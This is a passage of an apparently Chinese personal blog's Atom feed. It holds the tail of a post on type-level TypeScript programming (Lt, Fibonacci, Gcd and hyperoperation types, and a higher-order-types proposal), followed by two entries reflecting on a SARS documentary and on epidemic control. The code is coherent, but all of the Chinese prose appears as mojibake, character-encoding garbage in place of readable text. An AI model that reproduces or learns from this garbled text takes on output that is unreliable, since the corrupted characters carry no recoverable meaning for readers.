type _not_false = Not&lt;'false'&gt;; // 'true'</code></pre><p>ÊúÄÂêéÊòØÊØîËæÉËøêÁÆóÁ¨¶ÔºåÊàë‰ª¨ÂÖà‰ªéÂ∞è‰∫éÂè∑ÂºÄÂßãÔºåÈ¶ñÂÖàÂà§Êñ≠ <code>A</code> ÊòØÂê¶ÊòØ <code>0</code>ÔºåÁÑ∂Âêé <code>B</code> ÊòØÂê¶ÊòØ <code>0</code>ÔºåÊúÄÂêéÊòØ‰∏Ä‰∏™ÈÄíÂΩí„ÄÇËøôÊòØ‰∏Ä‰∏™‰∏âÂèâË∑ØÂè£Ôºå‰ΩÜÂØπ‰∫é TypeScript Êù•ËØ¥‰∏çÂú®ËØù‰∏ãÔºö</p><pre><code class="lang-typescript">type Lt&lt;A extends Int, B extends Int&gt; = {
    'A = 0': Not&lt;Eq&lt;B, _0&gt;&gt;
    'B = 0': 'false'
    'other': Lt&lt;Prev&lt;A&gt;, Prev&lt;B&gt;&gt;
}[
    A extends _0
        ? 'A = 0'
        : B extends _0
            ? 'B = 0'
            : 'other'
];

type _lt_1_2 = Lt&lt;_1, _2&gt;; // 'true'
type _lt_5_3 = Lt&lt;_5, _3&gt;; // 'false'
type _lt_4_4 = Lt&lt;_4, _4&gt;; // 'false'</code></pre><p>ÂÖ∂ÂÆÉÁöÑÁ¨¶Âè∑ÔºåÂÖ∂ÂÆûÂèØ‰ª•ÈÄöËøá <code>Lt</code>„ÄÅ<code>Eq</code> ÈÖçÂêà <code>And</code>„ÄÅ<code>Or</code>„ÄÅ<code>Not</code> Êù•ÂÆûÁé∞Ôºö</p><pre><code class="lang-typescript">type Lte&lt;A extends Int, B extends Int&gt; =
    // ‰ΩøÁî® `extends` Âíå `infer` Êù•ÊèêÂâçËÆ°ÁÆó a&lt;b
    Lt&lt;A, B&gt; extends infer R
        ? Or&lt;Cast&lt;R, Bool&gt;, Eq&lt;A, B&gt;&gt;
        : never;
type Gt&lt;A extends Int, B extends Int&gt; = Not&lt;Lte&lt;A, B&gt;&gt;;
type Gte&lt;A extends Int, B extends Int&gt; = Or&lt;Gt&lt;A, B&gt;, Eq&lt;A, B&gt;&gt;;</code></pre><h1>‰∏Ä‰∏™ÊØîËæÉÂÆåÁæéÁöÑÂÆûÁé∞</h1><p>Êúâ‰∫Ü‰πãÂâçÁöÑÁßØÁ¥ØÔºå‰∏äÈù¢ÁöÑÂá†‰∏™ÂáΩÊï∞Â∞±ÊØîËæÉÂ•ΩÂÜô‰∫ÜÔºö</p><pre><code class="lang-typescript">type Fibonacci&lt;N extends Int&gt; = {
    'true': _1
    // ‰ΩøÁî® `extends` Âíå `infer` Êù•ÊèêÂâçËÆ°ÁÆó f[n-1] Âíå f[n-2]
    'false': Fibonacci&lt;Sub&lt;N, _1&gt;&gt; extends infer F_N_1
        ? Fibonacci&lt;Sub&lt;N, _2&gt;&gt; extends infer F_N_2
            ? Add&lt;Cast&lt;F_N_1, Int&gt;, Cast&lt;F_N_2, Int&gt;&gt;
            : never
        : never
}[Lte&lt;N, _2&gt;];

type _fibonacci_1 = Fibonacci&lt;_1&gt;; // [any]
type _fibonacci_2 = Fibonacci&lt;_2&gt;; // [any]
type _fibonacci_3 = Fibonacci&lt;_3&gt;; // [any, any]
type _fibonacci_4 = Fibonacci&lt;_4&gt;; // [any, any, any]
type _fibonacci_5 = Fibonacci&lt;_5&gt;; // [any, any, any, any, any]
type _fibonacci_6 = Fibonacci&lt;_6&gt;; // [any, any, any, any, any, any, any, any]

type Gcd&lt;X extends Int, Y extends Int&gt; = {
    'true': X
    'false': Gcd&lt;Y, Mod&lt;X, Y&gt;&gt;
}[Eq&lt;Y, _0&gt;]

type H&lt;N extends Int, A extends Int, B extends Int&gt; = {
    'N = 0': Next&lt;B&gt;
    'N = 1 &amp; B = 0': A
    'N = 2 &amp; B = 0': _0
    'N &gt; 2 &amp; B = 0': _1
    // ‰ΩøÁî® `extends` Âíå `infer` Êù•ÊèêÂâçËÆ°ÁÆó h(n, a, b-1)
    'other': H&lt;N, A, Prev&lt;B&gt;&gt; extends infer R ? H&lt;Prev&lt;N&gt;, A, Cast&lt;R, Int&gt;&gt; : never
}[
    Eq&lt;N, _0&gt; extends 'true'
        ? 'N = 0'
        : And&lt;Eq&lt;N, _1&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
            ? 'N = 1 &amp; B = 0'
            : And&lt;Eq&lt;N, _2&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
                ? 'N = 2 &amp; B = 0'
                : And&lt;Gt&lt;N, _2&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
                    ? 'N &gt; 2 &amp; B = 0'
                    : 'other'
]

type _h_0_0_3 = H&lt;_0, _0, _3&gt;; // 3+1=4,  [any, any, any, any]
type _h_1_5_6 = H&lt;_1, _5, _6&gt;; // 5+6=11, [any, any, any, any, any, any, any, any, any, any, any]
type _h_2_4_2 = H&lt;_2, _4, _2&gt;; // 4*2=8,  [any, any, any, any, any, any, any, any]
type _h_3_3_3 = H&lt;_3, _3, _3&gt;; // 3^3=27, [any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any]</code></pre><h1>Êó†Ê≥ïÂÆûÁé∞ÁöÑÈóÆÈ¢òÔºå‰ª•ÂèäÊú™Êù•ÁöÑËß£ÂÜ≥ÊñπÊ°à</h1><p>‰∏äÈù¢ÁöÑ‰æãÂ≠êÁúãËµ∑Êù•ÂæàÂÆåÁæé„ÄÅÂæàÁ¨¶ÂêàÈÄªËæëÔºå‰ΩÜÊØïÁ´ü TypeScript Á±ªÂûãÁ≥ªÁªüÂπ∂‰∏çÊòØ‰∏∫‰∫ÜÂáΩÊï∞ÂºèÁºñÁ®ãËÄåÊúçÂä°ÁöÑÔºåÂõ†Ê≠§‰πüÊúâ‰∏Ä‰∫õÊÄùÊÉ≥ÊòØÂÆÉÊöÇÊó∂Êó†Ê≥ïÂÆûÁé∞ÁöÑ„ÄÇ</p><blockquote><p>Ê≥®ÊÑèÔºöÂè™ÊòØÊÄùÊÉ≥Êó†Ê≥ïÂÆûÁé∞„ÄÇTypeScript Á±ªÂûãÁ≥ªÁªüÂú®ÁêÜÊÉ≥Áä∂ÊÄÅ‰∏ãÊòØÂõæÁÅµÂÆåÂ§áÁöÑ„ÄÇ</p></blockquote><h2>ÊÉ∞ÊÄßËÆ°ÁÆó</h2><p>ËøôÂÖ∂ÂÆûÊòØ TypeScript ÁõÆÂâçÁöÑÂÆö‰ΩçÂíåËÆæËÆ°ÊâÄÂØºËá¥ÁöÑ„ÄÇÊú¨ÊñáÁöÑ‚ÄúÂáΩÊï∞‚ÄùÂè™ÊòØ TypeScript ‰∏≠ÊôÆÈÄöÁöÑ‚ÄúÂ∑•ÂÖ∑Á±ªÂûã‚ÄùÔºåÂπ∂Ê≤°ÊúâÁúüÊ≠£ÁöÑ‚ÄúÂáΩÊï∞‚ÄùÁöÑÂäüËÉΩÔºåÊâÄË∞ìÁöÑ‚ÄúËøîÂõûÂÄº‚Äù‰πüÂè™ÊòØË∑üËøô‰∏™ÂÆö‰πâÁöÑÂÜÖÂÆπÁ≠â‰ª∑ÁöÑ‚ÄúTypeScript Á±ªÂûã‚ÄùËÄåÂ∑≤„ÄÇËôΩÁÑ∂ÊØè‰∏™Â∑•ÂÖ∑Á±ªÂûãÊú¨Ë∫´ÂÜôËµ∑Êù•ÊòØÂáΩÊï∞ÂºèÁºñÁ®ãÔºå‰ΩÜ‰∏çÂêåÁöÑÂ∑•ÂÖ∑Á±ªÂûãÂç¥ÊòØÊåâÁÖßÂëΩ‰ª§ÂºèÈÄê‰∏ÄÂÆö‰πâÂπ∂Êé®ÂØºÁöÑ„ÄÇ</p><h2>ÂáΩÊï∞ÊòØ‰∏ÄÁ≠âÂÖ¨Ê∞ë</h2><p>ËÄÉËôëÂà∞ËøôÊ†∑‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂÆÉÁöÑËæìÂÖ•ÂíåËæìÂá∫ÈÉΩÊòØÂáΩÊï∞Ôºö</p><pre><code class="lang-javascript">function compose(...f) {
    return f.length === 0
        ? undefined
        : f.length === 1
          ? f[0]
          : (...args) =&gt; f[0](compose(...f.slice(1))(args));
}</code></pre><p>Â¶ÇÊûúÁî® TypeScript Á±ªÂûãÁ≥ªÁªüÊù•ÂÜôÔºå‰ºöÊòØ‰ªÄ‰πàÊ†∑ÁöÑÂë¢Ôºü</p><blockquote><p>Ê≥®ÊÑèÔºö‰ªéËøôÈáåÂºÄÂßãÔºåÊâÄÊúâÁöÑ TypeScript ‰ª£Á†ÅÂú®Êú¨ÊñáÂèëÂ∏ÉÁöÑÊó∂ÊúüÈÉΩÊòØÈîôËØØÁöÑÔºå‰∏çË¶ÅÊ®°‰ªø„ÄÇ</p></blockquote><pre><code class="lang-typescript">type Compose&lt;F&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]
            : ########</code></pre><p>‰∫ïÂè∑ÁöÑÈÉ®ÂàÜÂÜôËµ∑Êù•Âπ∂Ê≤°ÊúâÈÇ£‰πàÁõ¥ËßÇ„ÄÇ‰∫ãÂÆû‰∏äÔºåTypeScript ÁõÆÂâç‰∏çÊîØÊåÅÈ´òÈò∂Â∑•ÂÖ∑Á±ªÂûãÔºàHigher order typesÔºâÔºåÂõ†Ê≠§Êàë‰ª¨Ê≤°ÊúâÂäûÊ≥ïÊää‚ÄúÂáΩÊï∞‚Äù‰Ωú‰∏∫ËæìÂÖ•ÂíåËæìÂá∫„ÄÇ</p><h2>Êú™Êù•ÁöÑËß£ÂÜ≥ÊñπÊ°à</h2><p>ÁõÆÂâç TypeScript ÊúâËøôÊ†∑‰∏Ä‰∏™ ProposalÔºö<a href="https://github.com/microsoft/TypeScript/issues/1213#issuecomment-523245130">Higher Order, Lamda, Reference types</a>ÔºåÁõÆÂâçÁöÑÁä∂ÊÄÅÊòØ BacklogÔºàÂæÖÂäûÔºâ„ÄÇÂÆÉÁöÑËØ≠Ê≥ïÊúâÁÇπÁ±ª‰ºº‰∫é C ÈáåÈù¢ÁöÑÂáΩÊï∞ÊåáÈíàÔºö</p><pre><code class="lang-typescript">type A&lt;T extends string&gt; = { 0: T }
type B&lt;T extends string&gt; = [T]
type C&lt;T extends number&gt; = 42

// Here's our lamda
type Referer&lt;*Ref&lt;X extends string&gt;, T extends string&gt; = Ref&lt;T&gt;

type testA = Referer&lt;A, 'hi'&gt; // { 0: 'hi' }
type testB = Referer&lt;B, 'hi'&gt; // ['hi']
type testC = Referer&lt;C, 'hi'&gt; // ERROR</code></pre><p>ÂîØ‰∏ÄÈúÄË¶ÅÂÅöÁöÑÂ∞±ÊòØÂú®‚ÄúÂèÇÊï∞‚ÄùÂâçÈù¢Âä†‰∏Ä‰∏™ÊòüÂè∑ÔºåË°®Á§∫Ëøô‰∏™‚ÄúÂèÇÊï∞‚ÄùÊòØ‰∏Ä‰∏™Ê≥õÂûãÔºåËøôÊ†∑Êàë‰ª¨Â∞±ËÉΩÂ∞Ü‚ÄúÂáΩÊï∞‚Äù‰Ωú‰∏∫‚ÄúÂèÇÊï∞‚Äù‰º†ËøõÂéª‰∫Ü„ÄÇÂ¶ÇÊûúÁî®ÊôÆÈÄöÁöÑ‰ª£Á†ÅÊù•ÂÜôÔºåÂ§ßÊ¶ÇÊòØËøôÊ†∑Ôºö</p><pre><code class="lang-typescript">const a = (t: string) =&gt; ({ 0: t });
const b = (t: string) =&gt; [t];
const c = (t: number) =&gt; 42;

// Here's our lamda
const referer = (ref: (x: string) =&gt; any, t: string) =&gt; ref(t)

const testA = referer(a, 'hi') // { 0: 'hi' }
const testB = referer(b, 'hi') // ['hi']
const testC = referer(c, 'hi') // type mismatch</code></pre><p>ÂÖà‰∏çÁÆ°ÂÆÉ‰ª•Âêé‰ºö‰∏ç‰ºöË¢´ÂÆûÁé∞ÔºåËá≥Â∞ëÂèØ‰ª•Á°ÆÂÆöÁöÑÊòØÔºöÂ¶ÇÊûúÊúâ‰∫ÜËøô‰∏™ÂäüËÉΩÔºå‰∏äÈù¢‰∏§‰∏™ÈóÆÈ¢òÂ∞±ÈÉΩËÉΩËß£ÂÜ≥‰∫ÜÔºöÁ¨¨‰∫å‰∏™ÈóÆÈ¢òÊó†ÈúÄÂ§öËÆ≤ÔºõÂØπ‰∫éÁ¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåÁî±‰∫éÈúÄË¶ÅÊîØÊåÅ‰º†ÂÖ•‰∏Ä‰∏™Ê≥õÂûãÔºåÈÇ£‰πàÊîØÊåÅ‰º†ÂÖ•Ê≥õÂûãÁöÑÈÇ£‰∏™Ê≥õÂûãÔºà‰∏äÊñáÁöÑ <code>Referer</code>ÔºâÂú®‰º†ÂÖ•‰πãÂâçÊòØÊó†Ê≥ïË¢´Êé®ÂØºÁöÑ„ÄÇ‰ΩúËÄÖ‰πüËØ¥‰∫ÜÔºöIn this context, we can say that <code>*</code> "protects" against immediate evalutation.</p><h2>ÂÅö‰∏™ËÑëÂäõÊ∏∏ÊàèÂêß</h2><p>ÂÅáÂ¶ÇÁúüÁöÑÊúâ‰∫ÜËøô‰∏™ÂäüËÉΩÔºåÊàë‰ª¨ËØ•ÊÄé‰πàÂÆûÁé∞ <code>Compose</code> Âë¢Ôºü</p><pre><code class="lang-typescript">type Compose&lt;
    F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]
            : ########</code></pre><p>Ëøô‰∏™ÁâπÊÄß‰æùÊóßÊó†Ê≥ïËÆ©Êàë‰ª¨Âú®‰∫ïÂè∑ÁöÑÂú∞ÊñπÁõ¥Êé•Áî® <code>type xxx = yyy</code> ËøôÁßçÊñπÂºèÊù•ÂÆö‰πâ‚ÄúÂáΩÊï∞‚Äù„ÄÇ</p><p>ÊñπÊ≥ïÊÄªÊØîÂõ∞ÈöæÂ§öÔºå‰∏çÊòØ‰∏çËÉΩÂú®ÂÆö‰πâ‰∏≠ÂÆö‰πâÂêóÔºåÊàëÂú®‰πãÂâçÂÖàÂÆö‰πâÂ•Ω‰∏çÂ∞±ÂèØ‰ª•‰∫ÜÔºüÊàëÊää‰∫ïÂè∑ÈÉ®ÂàÜÊäΩÊàê‰∏Ä‰∏™ËæÖÂä©ÂáΩÊï∞ <code>P</code>Ôºö</p><pre><code class="lang-typescript">type P&lt;F extends Array&lt;*Ref&lt;T extends any&gt;&gt;&gt; = *(F[0])&lt;Compose&lt;Tail&lt;F&gt;&gt;&gt;;</code></pre><p>ÈÇ£‰πà‰∫ïÂè∑ÁöÑÈÉ®ÂàÜÂ∞±ÂèØ‰ª•Áõ¥Êé•ÂÜô <code>*(P&lt;F&gt;)</code> ‰∫ÜÔºÅ</p><p>ÁÑ∂ËÄåËøôÊúâ‰∏™ÈóÆÈ¢òÔºö<code>P</code> Ë¶ÅÂú® <code>Compose</code> ‰πãÂâçÂÆö‰πâÔºå‰ΩÜ <code>P</code> ÈáåÈù¢ÂèàÁî®Âà∞‰∫Ü <code>Compose</code>„ÄÇÂú®ÂáΩÊï∞ÂºèÁºñÁ®ã‰∏≠Êúâ‰∏Ä‰∏™ÊñπÊ≥ïÂèØ‰ª•Ëß£ÂÜ≥ÔºöÊàë‰ª¨ÂèØ‰ª•Â∞Ü <code>Compose</code> ‰Ωú‰∏∫ÂèÇÊï∞‰º†ÂÖ• <code>P</code>ÔºåÂ∞±ÂÉèËøôÊ†∑Ôºö</p><pre><code class="lang-typescript">type P&lt;
  *H&lt;*F extends Array&lt;*Ref&lt;T extends any&gt;&gt;&gt;,
  F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; = *(F[0])&lt;H&lt;Tail&lt;F&gt;&gt;&gt;;</code></pre><pre><code class="lang-typescript">type Compose&lt;
    F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]             // is a generic
            : *(P&lt;Compose, F&gt;) // is also a generic</code></pre><p>Êõ¥Ëøõ‰∏ÄÊ≠•ÔºåÊàë‰ª¨ÂèØËÉΩÂèØ‰ª•Êé®Âá∫ÂáΩÊï∞ÂºèÁºñÁ®ã‰∏≠ÁöÑ Y-ÁªÑÂêàÂ≠êÔºå‰ªéËÄå‰ªéÂè¶‰∏Ä‰∏™ÊñπÂêë‰∏äËØÅÊòé‰∫ÜÂÆÉÊòØÂõæÁÅµÁ≠â‰ª∑ÁöÑ„ÄÇ</p><h1>ÂèÇËÄÉËµÑÊñô</h1><ul><li><a href="https://www.byvoid.com/zhs/blog/apio-fp">APIOËÆ≤Á®ø‚Äî‚ÄîÂáΩÊï∞ÂºèÁºñÁ®ã - BYVoid</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R¬∑ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/389</id>
        <title><![CDATA[Âè™ÂÖ≥‰∫∫ÊÄßÔºàËßÇ„ÄäÈùûÂÖ∏ÂçÅÂπ¥Á•≠„ÄãÊúâÊÑüÔºâ]]></title>
        <updated>2020-02-02T11:02:37+08:00</updated>
        <link href="https://www.suruifu.com/posts/389"/>
        <content type="text/html" src="https://www.suruifu.com/posts/389"><![CDATA[<p><strong><em>Êú¨Êñá‰ΩúËÄÖÂ∞èÊùâ</em></strong></p>
<blockquote><p>
  Âú®‰ªäÂπ¥Êò•ËäÇËøô‰∏™ÁâπÊÆäÊó∂ÊúüÔºåÂá§Âá∞Âç´ËßÜÈáçÊñ∞Êé®Âá∫‰∫Ü7Âπ¥ÂâçÁöÑÁ∫™ÂΩïÁâá„ÄÇ
</p></blockquote>
<h3>‰∏ÄÂàáÈÉΩË¶ÅÂü∫‰∫é‰∫∫ÊÄß</h3>
<p>7Âπ¥ÂâçÁöÑ‰∫∫‰ª¨ËÆ§‰∏∫‰ø°ÊÅØÈÄèÊòéÂ∫¶‰∏çÂ§üÊòØÂØºËá¥ÈùûÂÖ∏Âú®Êâ©Êï£‰πãÂàùÊ≤°ÂæóÂà∞ÂêàÁêÜÁöÑÂÖ≥Ê≥®ÂíåÈáçËßÜÂéüÂõ†‰πã‰∏Ä„ÄÇÂú®Â∞èÂ∞èÂ±èÂπï‰∏äÁöÑ‰∏ÄÊù°Êù°Áü≠‰ø°ÔºåÁ°ÆÂÆûËÆ©Êàë‰ª¨ÊÑüÂèóÈÅ•ËøúÊó∂‰ª£ÁöÑÈôàÊóßÊÑü„ÄÇÂ¶Ç‰ªäÔºåÁΩëÈÄüÂèòÂø´Ôºå‰ø°ÊÅØÈÄèÊòéÂ∫¶Ëá™ÁÑ∂ÊèêÈ´òÔºåÊó©ÊúüÁöÑÊ∂àÊÅØ‰æùÁÑ∂Ë¢´ÂÆàÂæóÂØÜ‰∏çÈÄèÈ£éÔºåË∂äËá™Áî±ÂèçËÄåË∂ä‰∏•ÂØÜ„ÄÇ‰∏∫‰ªÄ‰πàÔºüËøôÊòØ‰∏Ä‰∏™Áõ∏ÂΩìËá™ÁÑ∂ÁöÑÂèçÊò†ÔºåÂ∞±ÂÉèÊ≤°‰∫∫ÊÑøÊÑèÊääÊâÄÊúâÁöÑÂ∞èÁº∫ÁÇπÂëäËØâ‰ªñ‰∫∫‰∏ÄÊ†∑„ÄÇ‰ΩïÊó∂ÈÄèÈú≤Ôºå‰ΩïÁßçÊñπÊ≥ïÈÄèÈú≤ÔºåÂèñÂÜ≥‰∫éÂØπ‰∫ãÊÉÖ‰∏•ÈáçÁ®ãÂ∫¶ÁöÑÂà§Êñ≠„ÄÇ</p>
<p>Âú®Ê≤ªÁñóËøáÁ®ã‰∏≠ÔºåÂá∫Áé∞‰∫ÜÂæàÂ§öÂèë‰∫∫Ê∑±ÊÄùÁöÑÂ∞èÊèíÊõ≤„ÄÇ‰∫∫‰ª¨ÂØπ‰∫éËΩ¨Èô¢ÂíåÂéª‰∏ìÈó®ÂåªÈô¢ËøôÁ±ª‰∫ãÊÉÖÔºåÊúâÁùÄÂº∫ÁÉàÁöÑÊäµËß¶ÊÉÖÁª™„ÄÇÂΩì‰∏Ä‰∏™‰∫∫Ë¢´ÈÄÅÂà∞Â∞èÊ±§Â±±Êó∂ÊãíÁªù‰∏ãËΩ¶ÔºåÂõ†‰∏∫ÂÆ≥ÊÄïË¢´ÈÄÅÂà∞ÈõÜ‰∏≠Ëê•ÔºåËøôÁúãËµ∑Êù•Êúâ‰∫õÂèØÁ¨ë„ÄÇÁÑ∂ËÄå‰º†ÊüìÁóÖÊäëÂà∂ÊñπÊ≥ï‰∏âÈÉ®Êõ≤‰πã‰∏ÄÊòØÊ∂àÈô§‰º†ÊüìÊ∫êÔºåË∞ÅÂèàËÉΩÁü•ÈÅìËøô‰∏™Ê∂àÈô§ÁöÑÁúüÊ≠£Âê´‰πâÊòØ‰ªÄ‰πàÂë¢ÔºüÂΩì‰∏™‰∫∫Âà©ÁõäÂíåÁ§æ‰ºöÂà©Áõä‰∏çÂÆåÂÖ®‰∏ÄËá¥Êó∂ÔºåË∞ÅÂèà‰∏ç‰ºö‰∫ßÁîüËøôÁßçÊÅêÊÉßÔºü</p>
<h3>ËΩªËΩªÂú∞Êù•Ê≠£Â¶ÇËΩªËΩªÂú∞Âéª</h3>
<p>SARSÁöÑÂá∫Áé∞ÂíåÊ∂àÂ§±Â∞±ÊòØËøô‰πàÁ™ÅÁÑ∂ÔºåÊ∂àÂ§±ÂêéÂ§öÂπ¥ÂÖ∂Ê∫êÂ§¥‰ªçÊó†‰ªéÁü•ÊôìÔºå‰∫¶Êó†ÁâπÊïàËçØ„ÄÇÂ•ΩÂÉèÂ≠òÂú®Êú¨Ë∫´Â∞±ÊòØÁî®Êù•ÊèêÈÜíÂíåÂò≤ËÆΩ‰∫∫Á±ªÁöÑÊ∏∫Â∞è‰∏ÄËà¨ÔºåÁÑ∂ËÄåÂØπÊàë‰ª¨ÁöÑÊèêÈÜíÔºåÊòØÂê¶ÁúüÁöÑË¢´Âê¨Âà∞Âë¢ÔºüÁ∫™ÂΩïÁâáÁöÑÊñ∞Èóª‰∏äËµ´ÁÑ∂ÂÜôÁùÄH1N1ÊµÅÊÑüÂú®‰∏äÊµ∑‰º†Êí≠ÔºåÂà∞‰∫Ü‰ªäÊó•‰∫∫‰ª¨Êâç‰∏çÊñ≠ÂÆ£‰º†Âã§Ê¥óÊâãÔºåÊà¥Âè£ÁΩ©„ÄÇËÆ©‰∫∫‰∏çÁ¶ÅÂèëÈóÆÔºåËôΩÁÑ∂ÊäÄÊúØÂú®ËøõÊ≠•ÔºåÁâ©Ë¥®Âú®‰∏∞ÂØåÔºåÂèØÊòØ‰∫∫Á±ªÁúüÁöÑËøõÊ≠•‰∫ÜÂêóÔºü</p>
<h3>ÂêéÊù•ÁöÑÂêéÊù•</h3>
<p>Âõ†ÁóÖÊ≠ªÂéªÂíå‰∏ÄÁõ¥Ê¥ªÂú®Èò¥ÂΩ±‰∏≠ÔºåÂà∞Â∫ïËØ•Â¶Ç‰ΩïÂèñËàçÔºüËôΩËØ¥SARSÊ≤°ÊúâÁâπÊïàËçØÔºåÂåªÁîüÂè™ËÉΩÂÖµÊù•Â∞ÜÊå°Ê∞¥Êù•ÂúüÊé©ÔºåÊøÄÁ¥†ÁöÑÈáèÁúüÁöÑÊòØÈöæ‰ª•ÊéßÂà∂ÔºüÊó†ÊöáÈ°æÂèäÔºüËøòÊòØ‰∏∫‰∫ÜÂá∫Èô¢ÁéáÂíåÊ≤ªÊÑàÁéá‰∏çÊÉú‰∏ÄÂàá‰ª£‰ª∑Âë¢ÔºüÂÖ∂‰∏≠Âπ¥ËΩªÂ∞èÊä§Â£´ÁöÑÊïÖ‰∫ãËÆ©‰∫∫ÂøÉÁñºÔºåÂØπ‰∫é‰∏Ä‰∏™Â∞èÂßëÂ®òÊù•ËØ¥ÔºåÂÅ•Â∫∑ÂíåÈí±Âì™‰∏™‰ª∑ÂÄºÊõ¥Â§ßÂë¢ÔºüÁúãÁùÄÂΩìÂπ¥‰∫∫‰ª¨ÂØπÊú™Êù•ÁöÑÈ¢ÑÊµãÔºå‚Äú‰ª•Âêé‰∏ç‰ºöÂèëÁîüËøôÊ†∑ÁöÑ‰∫ã‰∫Ü‚ÄùÔºåÊòØÈºìËàû‰ø°ÂøÉÁöÑÁæéÂ•ΩÊÑøÊúõËøòÊòØÂá∏Êòæ‰∫ÜÈ¢ÑÊµãÁöÑÊØ´Êó†‰ª∑ÂÄºÂë¢Ôºü</p>
<h3>ÁªèÊµéÂ≠¶ËßÜËßí</h3>
<p>ËøôÂá†Â§©‰∏ÄÁõ¥Âú®ÈòÖËØªËñõÂÖÜ‰∏∞ÁªèÊµéÂ≠¶ËÆ≤‰πâÔºåÊàë‰ª¨‰πãÊâÄ‰ª•Ê≤°ÊúâÂõ†ÈùûÂÖ∏ËÄåÂÅöÂá∫ÊîπÂèòÔºåÊòØÂõ†‰∏∫ÊàêÊú¨Â§™È´òÔºå‰ª∑ÂÄºÂ§™‰Ωé„ÄÇ‰øÆÂª∫ÂÖ®ÂõΩ‰º†ÊüìÁóÖÈ¢ÑÈò≤Á≥ªÁªüÊàñËÄÖÊòØÊé®Ë°å‰∏ÄÂ•óÂÖ®ÂõΩÂøÖÈ°ªÊâßË°åÁöÑÂÅ•Â∫∑ÂÆâÂÖ®Ê†áÂáÜ‰ºº‰πéÈÉΩÊúâ‰∫õ‰∏çÂêàÈÄÇ„ÄÇÊ≠§Â§ñÔºå‰∏é‰∏äÊ¨°‰∏çÂêåÔºåËøôÊ¨°‰ø°ÊÅØÈÄèÊòéÂ∫¶Â¢ûÂä†ÂíåÊ∞ë‰ºóÁöÑÂÖ≥Ê≥®Â∫¶ÊèêÈ´òÔºå‰∫∫ÊùÉ„ÄÅÈöêÁßÅÈóÆÈ¢ò„ÄÅ‰∫∫Ë∫´Ëá™Áî±Â∞±Ë¢´ÂÖ®Èù¢ÁöÑ‰æµÁäØ‰∫ÜÔºå‰∏çËøá‰∏ÄÂàá‰ª•Á§æ‰ºöÊïàÁõäÊúÄÂ§ßÂåñÁöÑÂâçÊèê‰∏ãÔºåËøôÂπ∂Ê≤°Êúâ‰ªÄ‰πàÈóÆÈ¢ò„ÄÇÂú®Èù¢ÂØπÊú™Áü•ÈóÆÈ¢òÊó∂Ôºå‰ª•ÊúÄËäÇÁ∫¶ÊàêÊú¨ÔºåÊúÄÊúâÊïàÁéáÁöÑÊñπÊ≥ïËß£ÂÜ≥ÔºåËÆ©ÈÅøÂÖçÊÑèÂ§ñÊàêÊú¨ÊúÄ‰ΩéÁöÑ‰∏ÄÊñπÊù•ÊâøÊãÖË¥£‰ªªÔºåÁöÑÁ°ÆÊòØËæÉÂ•ΩÁöÑÂäûÊ≥ï„ÄÇ‰ΩÜÊòØÔºåÂ¶ÇÊûú‰∏ç‰ª•Á§æ‰ºöÊïàÁõäÊúÄÂ§ßÂåñ‰∏∫ÁõÆÊ†áÂèà‰ºöÊòØÊÄéÊ†∑ÁöÑÂë¢ÔºüËøô‰∏ÄÁÇπÊàëËøòÊ≤°ÊÉ≥Ê∏ÖÊ•ö„ÄÇ</p>
<h3>ÁªìËØ≠</h3>
<p>ÂõûÊúõÂéÜÂè≤ÊàñËÄÖÈòÖËØªÁªèÂÖ∏Ôºå‰∏çÊòØ‰∏∫‰∫ÜÂäõÊåΩÁãÇÊæúÊàñÊòØÈÅøÂÖçÁÅæÁ•∏ÔºåËÄåÊòØÈÅáÂà∞Êó∂ÁÅæÁ•∏Êó∂ÔºåÊó†ËÆ∫ÁªìÊûúÈÉΩËÉΩÊõ¥Âù¶ÁÑ∂„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ËãèÁëûËæÖÁöÑ‰∏™‰∫∫ÁΩëÁ´ô]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/385</id>
        <title><![CDATA[ÊéßÂà∂‰º†ÊüìÁóÖÔºàËßÇ„ÄäÈùûÂÖ∏ÂçÅÂπ¥Á•≠„ÄãÊúâÊÑüÔºâ]]></title>
        <updated>2020-02-01T07:15:17+08:00</updated>
        <link href="https://www.suruifu.com/posts/385"/>
        <content type="text/html" src="https://www.suruifu.com/posts/385"><![CDATA[<blockquote><p>
  Â¶Ç‰ªäÂÖ®ÂõΩ‰∏ä‰∏ãÈÉΩËÉΩ‰∏é2019-ncovÂØπÊäóÔºåÊàëËßÇÁúã‰∫Ü„ÄäÈùûÂÖ∏ÂçÅÂπ¥Á•≠„ÄãËÆ∞ÂΩïÁâáÔºåÂú®Ê≠§ËÆ∞ÂΩï‰∏Ä‰∏ãËá™Â∑±ÁöÑÊÑüÂèó„ÄÇ
</p></blockquote>
<p><img src="https://s.suruifu.com/www/2020/02/2019-ncovÂÆûÂÜµ.png" alt="" /></p>
<p>‚Äú‰º†ÊüìÁóÖ‚ÄùÁî±‚Äú‰º†Êüì‚ÄùÂíå‚ÄúÁóÖ‚Äù‰∏§ÈÉ®ÂàÜÁªÑÊàêÔºåÊàëËÆ§‰∏∫ÊéßÂà∂‰º†ÊüìÁóÖ‰πüÂ∫îËØ•‰ªé‰∏§‰∏™ËßíÂ∫¶Êù•ËÄÉËôë„ÄÇ</p>
<h3>ÊéßÂà∂‚Äú‰º†Êüì‚Äù</h3>
